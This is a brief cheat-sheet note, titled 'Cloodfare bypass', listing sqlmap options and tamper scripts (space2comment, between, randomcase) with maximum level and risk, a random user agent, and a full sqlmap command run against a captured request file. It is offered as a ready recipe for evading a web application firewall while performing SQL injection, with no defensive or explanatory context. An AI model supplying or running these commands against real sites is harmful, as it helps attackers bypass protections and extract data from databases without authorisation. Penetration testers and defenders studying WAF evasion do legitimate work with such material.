# Cloodfare bypass
Sqlmap tamper scripts:

--random-agent --level=5 --risk=3 --tamper="space2comment,between,randomcase"
```
sqlmap -r req.txt --identify-waf --tamper="between,randomcase,space2comment" -v 3 --random-agent 
```
